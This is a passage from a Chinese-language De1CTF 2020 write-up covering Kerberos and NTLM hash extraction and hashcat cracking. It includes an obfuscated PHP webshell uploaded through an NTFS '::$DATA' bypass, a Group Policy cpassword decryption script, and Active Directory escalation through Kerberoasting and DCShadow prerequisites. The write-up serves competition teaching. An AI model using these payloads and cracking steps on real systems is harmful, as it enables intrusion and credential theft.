$krb5tgs$23$*De1CTF2020$test.local$part1/De1CTF2020*$b9bac2cd9555738bc4f8a38b7aa3b01d$12befde687b62d10d325ebc03e0dd0d6bca1f526240dfa6d23dc5bcafc224591dcf4ba97bf6219cfbe16f1b59d289800fdcc8f051626b7fe0c2343d860087c45b68d329fd1107cebe4e537f77f9eea0834ae8018a4fe8518f1c69be95667fd69dcc590d3d443a8530ff8e38ee7f7b6e378d64a8b43b985bcc20f941947ea9e8463fd7e0fa77f284368b9b489f6d557da1e02990cfc725723e5d452ff6e659717947805b852ad734c5acc8011e535b96cef3af796610196d31c725362f7426e0cf92985ffe0717baaf5066fdba760b90e2c9b7e15bc9a4952cff47d4a092d3be6128997f9ff85dbafb85a5569b5d021b2a23c6371cbdf8beaa68b332e6ba1c1a8dc43c50695498ed8c2dfbf11760af35e1b913cd36b8015df37a146d2696c8b6b5f2ce375f2674acc0ce04aa98b9d21291466ce7a2aeb5a72fda17fa53e5b41df67d3898457d05fc899096092b3aa5bc333cb75eb5eee4b1c33356e72d9d28d6d674a5e47f64c72afb580e8d4f713a5ae265a4c825c39c19313a532a23c27eaf24bcde29c5e65c13cc057e0db72094bcedb6049574e35e511847f460180ddd78f4c9187345b1068bd608ca238c20d200ffa7e3891d076fe6fcef93d044c79f5ec9fb33561a35acf785b2a203df6d07e39161d9d3cedbe6d4394bd2bf43e545acd03f796c7863d684f9db4a5eef070f71e58a4882c2387d0705f4bed32fd7986dd672a15f6cfa56fe127af7c157216b2ea4f61ab7963d9dcaf4bb9222a7cba86d6a5e6c24833ffbf1957d90224764a01e0cb5a90f12dfea4ddaef23e30c2bdafcbcd99031db5d0698c1a050fc679213a8b81b854c08686f43241a4ec937c71cd09c9519fa2bba3aa845c4e84dbd6d9bbc3a62c876fb4c30bfa7960f0f51587ece14a31add698b1b9743e14fc343394f8a346c8e24cc8c26a8f8246f6a68928d0118dea81fea9976af3c57fa4c764f565e458e065d5a2a3dd1b083f7851d4ae1b791ada853e9a20e5b169ea0b8b582711f04df4dad8b461771dda5fca11c3f8f82d85e657bbd57d12cf15c8bbce7ad6cd1ebf540c45aefd4aef2ec828b06f208bd57be6a5529481b9f8b8fad5962e86b349a720ec2a1380ed711ee0261b29383907dae6f7a45d3fff54efae7ace1f4d7193f4a4d932699a41c3deb3ba9934278942e8f09ecd4339de4059dd3ff06b78e773b6ab9826df7ea2a443dddd55cdf79db1f76e2f05105e6cc5f0c4bd494b9556d921c6cb3fa48d1ddd27cf077ebd3e44b716fc74d1115b293e348fb9676e6727a3a97a7c2b86e8b83d8f90b9bf628c71e56aabcac381a32d493db3f255378c498a0bf527a9677cb81ec89911a9b09d6ffe16e2f2de63728439f8275d9f6feac2da860c5aab772034b2b0b962c033f8102ac86b2a9b07a82e9c70be65fe371e9d296afbe0e7272b90256428553c6a4fb0a8f5290098e4dad4021d99a65f2a3fa4ad0d2f ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure>
<p>得到part1:79345612</p>
<h3><span id="part2">part2</span></h3>
<p>这其实是<code>AS-REPRoasting</code>，判定过程如下：</p>
<p>跟进LDAP查询的请求，发现有一个这样的过滤条件<code>(userAccountControl:1.2.840.113556.1.4.803:=4194304)</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/dpPUTgXieY9AGIw.png" alt><figcaption>4.png</figcaption>
</figure>
<figure>
<img src="https://i.loli.net/2020/05/05/IZRjrLFk8Eldpac.png" alt><figcaption>5.png</figcaption>
</figure>
<p><code>DONT_REQ_PREAUTH</code>的值为<code>4194304</code>，也就是说这个LDAP请求是查找开启了<code>Do not require Kerberos preauthentication</code>的用户，如果用户开启了<code>Do not require Kerberos preauthentication</code>那么就可以通过<code>AS-REPRoasting</code>去暴力破解这个用户的凭证。</p>
<p>还有一个判断方法是第一步发送AS-REQ请求的时候，AS-REP返回了一个<code>eRR-PROAUTH-REQUIRED</code>错误，不过这个方法不完全能判定是<code>AS-REPRoasting</code>，因为在默认情况下，<code>Windows Kerberos</code>客户端在第一个请求中不包括预身份验证信息，所以在正常认证中也会出现此情况。<code>eRR-PROAUTH-REQUIRED</code>只不过是进一步验证我们上面<code>AS-REPRoasting</code>的猜测</p>
<figure>
<img src="https://i.loli.net/2020/05/05/6jbiXVxd1gYsFMI.png" alt><figcaption>6.png</figcaption>
</figure>
<p>猜测是<code>AS-REPRoasting</code>过程之后，然后从AS-REP中把票据的<code>enc-part</code>部分提取出来</p>
<figure>
<img src="https://i.loli.net/2020/05/05/XzlLOxdZofhqIE2.png" alt><figcaption>7.png</figcaption>
</figure>
<p>构造成hashcat支持的的格式，<code>$krb5asrep$23$&lt;PRINCIPAL_NAME&gt;:&lt;FIRST_16_BYTES&gt;$&lt;REMAINING_BYTES&gt;</code></p>
<p>然后爆破即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 18200 $krb5asrep$23$De1CTF2020@test.local:2a00ca98642914e2cebb2718e79cbfb6$9026dd00f0b130fd4c4fd71a80817ddd5aec619a9b2e9b53ae2309bde0a9796ebcfa90558e8aaa6f39350b8f6de3a815a7b62ec0c154fe5e2802070146068dc9db1dc981fb355c94ead296cdaefc9c786ce589b43b25fb5b7ddad819db2edecd573342eaa029441ddfdb26765ce01ff719917ba3d0e7ce71a0fae38f91d17cf26d139b377ea2eb5114a2d36a5f27983e8c4cb599d9a4a5ae31a24db701d0734c79b1d323fcf0fe574e8dcca5347a6fb98b7fc2e63ccb125a48a44d4158de940b4fd0c74c7436198380c03170835d4934965ef6a25299e3f1af107c2154f40598db8600c855b2b183 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure>
<p>得到part2:74212345</p>
<h3><span id="part3">part3</span></h3>
<p>一个NTLM认证的过程，将数据包中的<code>Net-NTLM v2 hash</code>提取出来爆破即可，有两种方法，第一种方法是将<code>WWW-Authenticate</code>头的内容提取出来，第二种方法是直接从数据包中提取<code>Net-NTLM v2 hash</code>的各个部分</p>
<p>这里以第一种方法为例，将<code>WWW-Authenticate</code>头的内容提取出来，写一个脚本转换为<code>Net-NTLM v2 hash</code>即可</p>
<p>参考这篇文章<a href="https://www.innovation.ch/personal/ronald/ntlm.html" target="_blank" rel="noopener">https://www.innovation.ch/personal/ronald/ntlm.html</a></p>
<p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">NTLM=<span class="string">"NTLM TlRMTVNTUAADAAAAGAAYAH4AAAAkASQBlgAAAAgACABYAAAAFAAUAGAAAAAKAAoAdAAAAAAAAAC6AQAABYKIogoAY0UAAAAPZ+qOBf/ZoMFgp+YUgxdqNVQARQBTAFQARABlADEAQwBUAEYAMgAwADIAMABXAEkATgAxADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtZkcwqDVhdD4EzWOqvx0EgEBAAAAAAAAEwy5ECMI1gHSKQvAwlYXqAAAAAACAAgAVABFAFMAVAABAAwARABNADIAMAAxADIABAAUAHQAZQBzAHQALgBsAG8AYwBhAGwAAwAiAGQAbQAyADAAMQAyAC4AdABlAHMAdAAuAGwAbwBjAGEAbAAFABQAdABlAHMAdAAuAGwAbwBjAGEAbAAHAAgAEwy5ECMI1gEGAAQAAgAAAAgAMAAwAAAAAAAAAAAAAAAAEAAA7Ko9RN3EZAJsRTIGgTqvoLkY8q1D1Jfvj7a+sggyWKQKABAAAAAAAAAAAAAAAAAAAAAAAAkAHgBIAFQAVABQAC8AdABlAHMAdAAuAGwAbwBjAGEAbAAAAAAAAAAAAA=="</span></span><br><span class="line">b64_challenge=<span class="string">"NTLM TlRMTVNTUAACAAAACAAIADgAAAAFgomiVohvkPy3Pe0AAAAAAAAAAIIAggBAAAAABgOAJQAAAA9UAEUAUwBUAAIACABUAEUAUwBUAAEADABEAE0AMgAwADEAMgAEABQAdABlAHMAdAAuAGwAbwBjAGEAbAADACIAZABtADIAMAAxADIALgB0AGUAcwB0AC4AbABvAGMAYQBsAAUAFAB0AGUAcwB0AC4AbABvAGMAYQBsAAcACAATDLkQIwjWAQAAAAA="</span></span><br><span class="line">challenge= b64_challenge[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)[<span class="number">24</span>:<span class="number">24</span>+<span class="number">8</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">message = NTLM[<span class="number">5</span>:].decode(<span class="string">"base64"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msg2str</span><span class="params">(msg,start,uni=True)</span>:</span></span><br><span class="line">    len = ord(msg[start+<span class="number">1</span>])*<span class="number">256</span> + ord(msg[start])</span><br><span class="line">    offset = ord(msg[start+<span class="number">5</span>])*<span class="number">256</span> + ord(msg[start+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">if</span> uni:</span><br><span class="line">        <span class="keyword">return</span> (msg[offset:offset+len]).replace(<span class="string">"\x00"</span>,<span class="string">""</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> msg[offset:offset+len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = msg2str(message,<span class="number">36</span>)</span><br><span class="line">domain = msg2str(message,<span class="number">28</span>)</span><br><span class="line">response = msg2str(message,<span class="number">20</span>,<span class="keyword">False</span>)</span><br><span class="line">NTProofStr = response[<span class="number">0</span>:<span class="number">16</span>].encode(<span class="string">"hex"</span>)</span><br><span class="line">blob = response[<span class="number">16</span>:].encode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&#123;user&#125;::&#123;domain&#125;:&#123;challenge&#125;:&#123;NTProofStr&#125;:&#123;blob&#125;"</span>.format(user=user,domain=domain,challenge=challenge,NTProofStr=NTProofStr,blob=blob))</span><br></pre></td></tr></table></figure>
<p>得到<code>Net-NTLM v2 hash</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000</span><br></pre></td></tr></table></figure>
<p>然后hashcat爆破即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 5600 De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure>
<p>得到part为<code>74212345</code></p>
<p>所以最终flag为：De1CTF{79345612_15673223_74212345}，上面的3个部分都是有工具可以提取hash的，篇幅有限这里就不过多演示了。</p>
<h3><span id="end">END</span></h3>
<p>其实Part1和Part2也不一定说是攻击过程，正常域认证出现这样的数据包也是很正常不过的，所以我才在我在中间加上了LDAP的查询语句，是想要选手快速定位数据包。还有就是密码长度设置的也不是很长，我这边跑完3个部分用时不到<code>1分钟</code>，有的队拿超算来跑，还有老外拿矿机来跑，看来我这题是真有“价值”啊233333</p>
<h2><span id="hard_pentest">Hard_Pentest</span></h2>
<p>上传</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 47.113.219.76</span><br><span class="line">Content-Length: 1918</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://47.113.219.76</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.87 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://47.113.219.76/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php::$DATA&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&apos;!&apos;==&apos;@&apos;]?&gt;&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___ =$__?&gt;</span><br><span class="line">&lt;?=$____=$___?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__.$___?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$___.=$__?&gt;</span><br><span class="line">&lt;?=$____=&apos;_&apos;?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$_=$$____?&gt;</span><br><span class="line">&lt;?=$___($_[_])?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name=&quot;submit&quot;</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD--</span><br></pre></td></tr></table></figure>
<p>得到webshell后，发现flag不在web服务器上，猜测应该是内网渗透，为了方便操作可以弹个<code>meterpreter</code>或者<code>beacon</code>回来。然后下一步就是内网渗透了，简单信息收集一下，发现域控共享文件夹Hint有一个压缩包<code>flag1_and_flag2hint.zip</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/VCn4FW2amxzYbpw.png" alt><figcaption>1.png</figcaption>
</figure>
<p>将其下载下来，发现压缩包需要密码，继续信息收集，发现有一个用户<code>HintZip_Pass</code>，猜测压缩密码应该是从这个用户下手。</p>
<figure>
<img src="https://i.loli.net/2020/05/05/vPFWmMsaQSrzNVn.png" alt><figcaption>2.png</figcaption>
</figure>
<p>然后收集<code>Zip_Password</code>用户的一些信息，发现这个用户是属于<code>Zip_Password</code>这个OU的，而不是常规的Users容器</p>
<figure>
<img src="https://i.loli.net/2020/05/05/C7cJ9afkQuGbM1m.png" alt><figcaption>3.png</figcaption>
</figure>
<p>发现这个OU有一个<code>gplink</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/F2w5M9LPtsrzfnu.png" alt><figcaption>4.png</figcaption>
</figure>
<p>然后对这个GPO进行信息收集，发现</p>
<figure>
<img src="https://i.loli.net/2020/05/05/bPR6IZ7mpBNk14Q.png" alt><figcaption>6.png</figcaption>
</figure>
<p>然后用<code>Get-GPPPassword.ps1</code>即可得到压缩包密码</p>
<figure>
<img src="https://i.loli.net/2020/05/05/KUwZt3nkrH8SgpR.png" alt><figcaption>5.png</figcaption>
</figure>
<p>或者写一个脚本将<code>cpassword</code>解密也可以</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">key = <span class="string">"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">cpassword = <span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span></span><br><span class="line">cpassword += <span class="string">"="</span> * ((<span class="number">4</span> - len(cpassword) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">plain = AES.new(key, AES.MODE_CBC, <span class="string">"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">plain = plain.decrypt(password)</span><br><span class="line"><span class="keyword">print</span> plain[:-ord(plain[<span class="number">-1</span>])].decode(<span class="string">'utf16'</span>)</span><br></pre></td></tr></table></figure>
<p>解压之后即可得到flag1，以及flag2的一些hint</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&apos;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure>
<p>根据Hint，需要用户De1ta才能得到flag2，然后对De1ta用户进行信息收集，发现web用户对De1ta用户的<code>servicePrincipalName</code>属性具有写权限</p>
<figure>
<img src="https://i.loli.net/2020/05/05/K8YJMgxf6SmNCbn.png" alt><figcaption>8.png</figcaption>
</figure>
<p>根据Hint2猜测应该是通过web用户给De1ta设置spn然后通过<code>Kerberoasting</code>去暴力破解De1ta用户的密码。</p>
<p>尝试给De1ta用户设置spn</p>
<figure>
<img src="https://i.loli.net/2020/05/05/bRzpTnIfJKluUkD.png" alt><figcaption>9.png</figcaption>
</figure>
<p>然后<code>Kerberoasting</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/zs1ewu7xq256Fbd.png" alt><figcaption>10.png</figcaption>
</figure>
<p>然后根据Hint2用hashcat离线爆破即可得到De1ta用户的密码</p>
<p>PS：这里也可以通过LDAP协议在线暴力破解，但是密码长度为<code>16^1 + 16^2 + 16^3 + 16^4 + 16^5 + 16^6 + 16^7 + 16^8 = 4581298448</code>，很显然在线暴力破解不现实。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*USER$DOMAIN$test/test*$64EC0B10760E27F6EF4811DA3478C56D$77696AF42F593CF24D6B62D3DFEEF4AF8451E912AEC808B81BB2A833059EF7B0E9B41695D572B73917814E2439581239D264F4EF8ED6FC4DBC8DF5EA7D1F5CAD0B3197BFC16798C8EF2546B6DE4504D0F1C007EEA3222E948A448D818BDC8E4C26BBE2FD5D321BB0E2B0C6985383D9BA2E83E6389B4043E6CD04F2715C3159B7374DB32B817B4B3B04537CFDACD6FF54911F076EED74F820AF85D17FF93081775828E70DCD4489819EB6C6D518CF0C10F498B9A96EAA9CA330E8CE81C02D795572991D8979E39A6C633E849FCBC2831943F067320E41BF4FB0A9B8EB2EEC4CDD91606BDA4DF32A8BB4869D2CD424D9A156943D20E91F08C6EFA65B7C7AFC41309BCDA965E95D81318E47044D9333012914BBF27B1A48FC55BF8494DD65F317CAFA22F42F290335161ACE544841C196EBC239EE99A7F31C215119421390FAD8F16AAC63A7F83066B4CC5FB6AB89C61691E9202B447A4E920AF42A641133753AD5CF51580FBBAE080EBBAF589A1DF1E9543288A18116A0E191261149E63B88874BA607B3E4517EF84F3BA9B18255B58B3FF2C8570DCABC12F4FC0DA49AE61A92E8AF3C0ECD746BFF591743EFBC438E15CC645ECA3BFD935649168367287DD4E8029FC4454FAE237E8048FA701F8901EC9B4B5372E6B85802AB8A26F233D583F79F49CBAC378838E3C05AB2C2065C35A6C5D8B0B92D7F438E80BF3A1D847DC174BB0D370EB09125D710243001A9D988E350B43D556AEE8F09053790AAAFC395292EE2FAD3B7A04EB330AB90D2EAE29D9D922F0BB65ED2FF05A9A73B09001F5AECE1BC7162DE480F5463C7B19932B50DFA0329CDF0F964EFC0647FB7319408B541587D6AF2730EC52243E7A7BAB096AFB1FA6E7A81A7148347B43394BC3E280062105C1A6859F278C829E3BBAC3FD4F545154657BC4E0F55AF439140B3B1D29EE4209B8F83E3E3DDC52A6C32E92EB2836F80AF972B54D029D8EC071BD12BDCA45DBDF555A64B16AEC90CC486159D07D53A9D9196E5A736F48350F5639F482B45E7BA3EC11A9B7CA4DD8BC6320058CA0D891F5B4B1BFE0243E8D9640380492B0BEFB9EC13B8A4B2DE4297C3DE84FDB2753693F5E9FFB46FC1F60748AF1A07DE60F7656DBEDB927E3DF35B1AE8588BA6450C8D7539F982385D1B8AC25B37638EF9414519F37773A353EBBAAF996DF17DDE3CBF64B9ACFBEF65E12773004BDF5B6B81CC8CF5D2B59C6A2AAA883B458676AD2800710FA3F017C2E53B353D4E2C6B0D92D57B79939D29FAA8049F6CF0782E2572ACE8E8FFDFE1A05AC277924D4826606F5C68369C15186910DAEC601CA691910DCE519D58EDC964D5844FE8B7B21F9F99C6891FAE7DC0D783EA78EF6393A92F273D98353718670BA167A9CC9809B03195EDA8323B7C887040CD37FF4A09 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure>
<figure>
<img src="https://i.loli.net/2020/05/05/1FcBuURiYK9NwVH.png" alt><figcaption>11.png</figcaption>
</figure>
<p>根据Hint3：注意De1ta在域上的拓展权限，然后对域的ACL进行信息收集</p>
<figure>
<img src="https://i.loli.net/2020/05/05/GFscQ52ryqzDbVH.png" alt><figcaption>12.png</figcaption>
</figure>
<p>发现De1ta用户在域上有<code>Add/Remove Replica In Domain</code>、<code>Replication Synchronization</code>、<code>Manage Replication Topology</code>权限，这很容易想到Dcshadow，但是单单三个权限还是不满足Dcshadow的条件的，还要对当前主机属性具有写权限以及对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限。然后再收集一波相关的ACL</p>
<p>发现De1ta用户对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限</p>
<figure>
<img src="https://i.loli.net/2020/05/05/dcwhRPqpyLxbTrQ.png" alt><figcaption>13.png</figcaption>
</figure>
<p>De1ta对当前主机DM属性具有写权限，刚好满足Dcshadow的所有权限</p>
<figure>
<img src="https://i.loli.net/2020/05/05/9QMeEHbmWZOT4CL.png" alt><figcaption>14.png</figcaption>
</figure>
<p>但是现在还有一个问题是，Dcshadow需要system权限去调用本地的RPC服务，上面说过De1ta对当前主机DM属性具有写权限，通过信息收集可以知道域控是<code>Windows Server 2012R2</code></p>
<figure>
<img src="https://i.loli.net/2020/05/05/tuUW5Tsv8akISbY.png" alt><figcaption>38.png</figcaption>
</figure>
<p>所以我们可以通过基于资源的约束委派对当前主机进行本地提权。</p>
